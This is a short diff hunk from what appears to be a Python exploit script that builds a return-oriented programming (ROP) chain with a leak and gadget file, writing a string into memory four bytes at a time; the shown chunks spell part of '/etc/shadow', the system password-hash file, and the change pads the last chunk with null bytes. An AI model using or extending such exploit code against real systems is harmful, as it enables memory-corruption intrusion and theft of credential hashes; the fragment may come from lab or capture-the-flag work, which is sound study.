@@ -147,7 +147,7 @@ def build(leak, gadget_file, sled_length, adjuster):
     rop = write4(rop, gadget_file, adjuster, string_location + 28,
             b'shad')
     rop = write4(rop, gadget_file, adjuster, string_location + 32,
-            b'ow\x00')
+            b'ow\x00\x00')
 
 
     rop = write4(rop, gadget_file, adjuster, string_location + 40,
